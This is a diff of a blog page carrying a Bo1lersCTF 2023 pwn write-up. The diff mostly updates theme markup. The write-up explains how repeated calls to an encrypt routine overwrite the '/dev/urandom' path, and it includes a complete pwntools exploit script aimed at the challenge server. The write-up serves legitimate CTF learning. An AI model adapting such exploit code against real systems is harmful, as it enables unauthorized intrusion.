@@ -15,31 +15,30 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="DescriptionA tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt files Analysis12345Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE">
+    <meta name="description" content="DescriptionA tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt files AnalysisArch:     amd64-64-little RELRO:    No RELRO Stack:    No canary found NX:       NX enabled PIE:">
 <meta property="og:type" content="website">
 <meta property="og:title" content="[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]">
 <meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html">
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
-<meta property="og:description" content="DescriptionA tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt files Analysis12345Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE">
+<meta property="og:description" content="DescriptionA tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt files AnalysisArch:     amd64-64-little RELRO:    No RELRO Stack:    No canary found NX:       NX enabled PIE:">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://www.aynakeya.com/2023-03-28_214738.png">
 <meta property="og:image" content="http://www.aynakeya.com/2023-03-28_214958.png">
 <meta property="og:image" content="http://www.aynakeya.com/2023-03-28_220216.png">
 <meta property="og:image" content="http://www.aynakeya.com/2023-03-28_215944.png">
-<meta property="article:published_time" content="2023-03-29T04:24:00.000Z">
-<meta property="article:modified_time" content="2023-03-29T04:24:00.000Z">
+<meta property="article:published_time" content="2023-03-28T13:24:00.000Z">
+<meta property="article:modified_time" content="2023-03-28T13:24:00.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://www.aynakeya.com/2023-03-28_214738.png">
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html","path":"ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html","title":"[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]"}</script>
@@ -51,6 +50,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -110,25 +130,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -165,7 +185,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -176,7 +196,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -232,7 +252,11 @@
       <div class="post-body">
           <h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>A tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/b01lers/b01lers-ctf-2023-public/tree/main/pwn/cfifufuuufuuuuu">files</a></p>
-<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 <h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><p>my analysis database <a href="./s.bndb">s.bndb</a></p>
@@ -254,7 +278,55 @@
 <p>normally it&#39;s okay, because we are only executing <code>encrypt</code> function once.</p>
 <p>however, since we can run <code>encrypt</code> function multiple time. we increase the index value until we overwrite <code>/dev/urandom</code> string.</p>
 <h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><p>we overwrite <code>/dev/urandom</code>, and the program will print out the flag for us!</p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;s&quot;)</span><br><span class="line"># exe_rop = ROP(exe)</span><br><span class="line"># libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"># ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"># context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">def wait(*msg):</span><br><span class="line">    if args.WAIT:</span><br><span class="line">        input(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([&quot;python&quot;,&quot;./loader.py&quot;])</span><br><span class="line">        r.recvuntil(b&quot;pid=&quot;)</span><br><span class="line">        pid = int(r.recvuntil(b&quot;;\n&quot;,drop=True))</span><br><span class="line">        print(&quot;pid of the binary is %d&quot; % pid)</span><br><span class="line">        if args.R2:</span><br><span class="line">            util.proc.wait_for_debugger(pid)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;ctf.b01lers.com&quot;, 5215)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">flagstring = b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)</span><br><span class="line">nonesense = b&#x27;\x00&#x27;*0x10</span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    0x0: b&#x27;\x00&#x27;*0x10, # make all 0, easier for xor</span><br><span class="line">    0x38:[</span><br><span class="line">        0x00004005e2, # _start if eax=1, call main again </span><br><span class="line">    ]</span><br><span class="line">&#125;)+b&#x27;\n&#x27;</span><br><span class="line"># filled up data</span><br><span class="line">for i in range(8):</span><br><span class="line">    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)</span><br><span class="line">    io.sendafter(b&quot;Your key?:\n&quot;,payload)</span><br><span class="line"># overflow /dev/urandom</span><br><span class="line">io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">io.recvuntil(b&quot;Your key:\n&quot;)</span><br><span class="line">lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop=True))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre class="line-numbers language-none"><code class="language-none">from pwn import *
+
+exe &#x3D; ELF(&quot;s&quot;)
+# exe_rop &#x3D; ROP(exe)
+# libc &#x3D; ELF(&quot;libc.so.6&quot;)
+# ld &#x3D; ELF(&quot;.&#x2F;ld-2.27.so&quot;)
+
+context.binary &#x3D; exe
+# context.log_level &#x3D; &#39;DEBUG&#39;
+
+def wait(*msg):
+    if args.WAIT:
+        input(&quot; &quot;.join(map(str,msg)))
+
+def log_print(*msg):
+    log.info(&quot; &quot;.join(map(str,msg)))
+lp &#x3D; log_print
+def start():
+    if args.LOCAL:
+        r &#x3D; process([&quot;python&quot;,&quot;.&#x2F;loader.py&quot;])
+        r.recvuntil(b&quot;pid&#x3D;&quot;)
+        pid &#x3D; int(r.recvuntil(b&quot;;\n&quot;,drop&#x3D;True))
+        print(&quot;pid of the binary is %d&quot; % pid)
+        if args.R2:
+            util.proc.wait_for_debugger(pid)
+    else:
+        r &#x3D; remote(&quot;ctf.b01lers.com&quot;, 5215)
+    return r
+
+
+io &#x3D; start()
+flagstring &#x3D; b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)
+nonesense &#x3D; b&#39;\x00&#39;*0x10
+payload &#x3D; flat(&#123;
+    0x0: b&#39;\x00&#39;*0x10, # make all 0, easier for xor
+    0x38:[
+        0x00004005e2, # _start if eax&#x3D;1, call main again 
+    ]
+&#125;)+b&#39;\n&#39;
+# filled up data
+for i in range(8):
+    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)
+    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)
+    io.sendafter(b&quot;Your key?:\n&quot;,payload)
+# overflow &#x2F;dev&#x2F;urandom
+io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)
+io.recvuntil(b&quot;Your key:\n&quot;)
+lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop&#x3D;True))
+io.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
       </div>
       
@@ -281,7 +353,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -308,28 +380,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
